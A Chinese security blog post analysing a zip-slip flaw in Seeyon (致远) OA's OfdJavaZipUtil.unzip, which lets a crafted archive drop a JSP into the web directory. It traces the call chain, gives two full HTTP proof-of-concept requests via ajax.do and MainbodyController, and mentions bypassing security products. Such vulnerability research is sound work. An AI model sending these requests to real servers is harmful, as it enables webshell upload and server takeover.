致远OA代码审计系列五-ofd解压漏洞分析
=====================

原创 作者:archive 公号:安全回忆录 发布时间:2023-12-04 0:00 发表于北京

原文地址：[致远OA代码审计系列五-ofd解压漏洞分析](https://mp.weixin.qq.com/s/_uaupYgj656gEaLhRSqmQA)

**漏洞描述:**

根据致远OA官方补丁定位到问题方法为OfdJavaZipUtil的unzip方法,未对压缩包内容进行任何检测, 存在zipslip漏洞,对压缩包内文件名使用../进行目录穿越, 解压jsp可执行文件到web目录。

******适用版本:******

V5/G6 V8.0SP2及以上全系列版本。

******漏洞分析:******

OfdJavaZipUtil的unzip方法中, 解压过程中未对压缩包文件进行任何校验, 通过全局搜索关键则发现GovdocGBManagerImpl的getOfdMetadata方法中对OfdJavaZipUtil.unizp进行了调用, 且GovdocGBManagerImpl可以直接通过ajax.do路由进行反访问,  漏洞整体的利用思路如下图:

**********![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPBQjYqicbWiceNNXyhicTaKHouiaV0fytGlSENYjErYltcQVLicsfdricS3KQ/640?wx_fmt=png&from=appmsg)**********

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPKlj99tAltwdWqUl8lwrq0UShGHFWEnB8NT35g70gMOOQR96iaOUblnA/640?wx_fmt=png&from=appmsg)

通过ajax.do路由调用GovdocGBManagerImpl类的getOfdMetadata方法, 最终进入到OfdJavaZipUtil的unzip. 完成不安全的解压, 但是还有一个前提, getOfdMetadata传入的是一个id参数, 解压压缩包必须保证当前文件存在, 否则直接返回null。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPoRyUo7MPrzxl4aAiaNyYictLjgDPWibK0JwfEyRX84WmR0PjY2ctqA1UQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPeKLKjW60sEuBJWRGJiaPQDXvEGlncNFNbZ9TRRcwQJ6q1K4dOkcianOw/640?wx_fmt=png&from=appmsg)

getFile是通过数据库查询判断文件是否存在, 那么只需要找到一处上传点, 该上传需要将fileId记录到数据库中,但文件并未存储在数据库中, 是通过查询fileId定位到文件位置。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPkTnNsnN0Sltn4hlzMXUMWMmqEZwF3FBaweffEBaRyiavfg2AKXvGASA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPYrbBjgibCJjfxmIp0KonAIDlR0deW0QoFngk0Hsut1RjEKarliaruBeg/640?wx_fmt=png&from=appmsg)

直接搜索this.v3xFileDAO.save, 可以定位到多处上传点, 这里使用fileManager.uploadFiles, 在FileUploadController的processUpload方法中进行了调用,  整体的调用链如下:  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPfoDqhJ1KvyiaMmXib2EDict9wglUXtDkezSXNnDbhdTsDyCCPzQjzMAkg/640?wx_fmt=png&from=appmsg)

首先制作一个恶意的zip文件。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPic8p4UT9nraraExKkXhjgSVUBDsXibCZcqTdyDVk3Ra165GibhOtZ3DVA/640?wx_fmt=png&from=appmsg)

上传文件:  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPGJZyGicT8NI7LgDKpGwIs9w01bOh8XUvbmdeXxz86YicIZ5Is0T6UhEg/640?wx_fmt=png&from=appmsg)

解压文件:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPib9o74E74N1pFia3sD0aYTIUEqiaNBb6Zf7Nx0G895PLj7DVjJ36U0x6g/640?wx_fmt=png&from=appmsg)

poc如下:

```http
POST /seeyon/ajax.do;Jsessionid=a?method=ajaxAction&managerName=govdocGBManager&rnd=29981 HTTP/1.1
Accept: */*
CSRFTOKEN: 
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=1; avatarImageUrl=3003611276195810894; login_locale=zh_CN
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 63


arguments=["-7373142480696292225"]&managerMethod=getOfdMetadata
```

成功上传:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPiaYgQiaHiciccicE4IHEckoE2Gc7LOcgqEmWian6ddoUSScnfexEe14e5p3g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMuXje2bblic9NK6R3P5Q3MlPvcQO3EoQ9ibHHYjIWT81Yh3uNd8PiaFnmcbTuxEEylicGgVu5ZZjl5NlQ/640?wx_fmt=png&from=appmsg)

除了通过ajax.do调用, 网上还有师傅们通过MainbodyController的invokingForm方法进行调用, 但整体来说通过ajax.do路由调用方便且简单很多. 在一定条件下还可以配合requestCompress绕过相关安全产品防护。使用MainbodyController的poc如下:

```http
GET /seeyon/content/content.do?method=invokingForm&extensions=zip&isNew=1&ofdFileId=-3217079395985044654&subApp=2 HTTP/1.1
Accept: */*
CSRFTOKEN: 
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=1; avatarImageUrl=3003611276195810894; login_locale=zh_CN
Accept-Encoding: gzip, deflate

```

**总结:**

该漏洞属于典型的java zipslip漏洞, 在压缩包内文件名使用../将文件解压到任意目录,致远官方于2023-6月发布补丁修复该漏洞。